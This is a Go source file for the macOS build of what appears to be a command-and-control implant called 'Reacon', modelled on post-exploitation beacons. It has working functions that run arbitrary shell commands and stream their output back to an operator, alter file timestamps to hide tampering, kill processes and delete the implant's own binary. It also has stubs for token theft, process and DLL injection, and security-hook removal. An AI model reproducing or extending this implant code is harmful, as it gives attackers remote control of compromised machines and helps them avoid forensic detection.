//go:build darwin

package commands

import (
	"Reacon/pkg/communication"
	"bytes"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func Shell(path string, args []byte) ([]byte, error) {
	path = "/bin/sh"
	args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	args = bytes.Trim(args, " ")
	startPos := bytes.Index(args, []byte("-c"))
	args = args[startPos+3:]
	argsArray := []string{"-c", string(args)}
	cmd := exec.Command(path, argsArray...)
	stdout, err := cmd.StdoutPipe()
	cmd.Stderr = cmd.Stdout
	if err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}
	if err = cmd.Start(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	var buf []byte
	var count int
	time.Sleep(500 * time.Millisecond)
	buf = make([]byte, 1024*50)
	count, err = stdout.Read(buf)
	communication.DataProcess(0, buf[:count])
	for {
		buf = make([]byte, 1024*50)
		count, err = stdout.Read(buf)
		if err != nil {
			break
		}
		communication.DataProcess(0, append([]byte("[+] "+string(path)+" "+string(args)+" :\n"), buf[:count]...))
		time.Sleep(5000 * time.Millisecond)
	}

	if err = cmd.Wait(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	return []byte("success"), nil

}

func Execute(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func TimeStomp(from []byte, to []byte) ([]byte, error) {
	cmd := exec.Command("/bin/bash", "-c", fmt.Sprintf("touch -c -r %s %s", string(from), string(to)))
	err := cmd.Start()
	if err != nil {
		return nil, err
	}
	return []byte(fmt.Sprintf("timestomp %s to %s", from, to)), nil
}

func Run(b []byte, Token uintptr, argues map[string]string) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func Drives() ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func PowershellImport(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func PowershellPort(portByte []byte, b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func EncryptHeap() ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func DoSuspendThreads() ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func DoResumeThreads() ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func ExecuteAssembly(sh []byte, params string) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func InjectProcess(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func Spawn_x64(sh []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func HandlerJob(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func Steal_token(pid uint32) (uintptr, []byte, error) {
	return 0, nil, errors.New("This function is not supported on this platform now.")
}

func Run2self() (bool, error) {
	return false, errors.New("This function is not supported on this platform now.")
}

func Make_token(b []byte) (uintptr, error) {
	return 0, errors.New("This function is not supported on this platform now.")
}

func Spawn_X86(sh []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func Spawn_X64(sh []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func KillProcess(pid uint32) ([]byte, error) {
	err := syscall.Kill(int(pid), 15)
	if err != nil {
		return nil, errors.New("process" + strconv.Itoa(int(pid)) + "not found")
	}
	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
}

func DllInjectSelf(params []byte, b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func DllInjectProcess(params []byte, b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func InjectProcessRemote(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func DeleteSelf() ([]byte, error) {
	filename, err := os.Executable()
	if err != nil {
		return nil, err
	}
	Path := strings.ReplaceAll(string(filename), "\\", "/")
	err = os.RemoveAll(Path)
	if err != nil {
		return nil, errors.New("Remove failed")
	}
	return []byte("Remove " + string(filename) + " success"), nil
}

func HideConsole() error {
	//return errors.New("this platform not supports HideConsole now.")
	return nil
}

func GetPrivs(privs []string, stolenToken uintptr) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func SetProcessDPIAware() error {
	//return errors.New("SetProcessDPIAware is not supported on this platform now.")
	return nil
}

func Runu(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func FullUnhook() error {
	return errors.New("Unhooking is not supported on this platform now.")
}
func Inline_Bin(data []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}
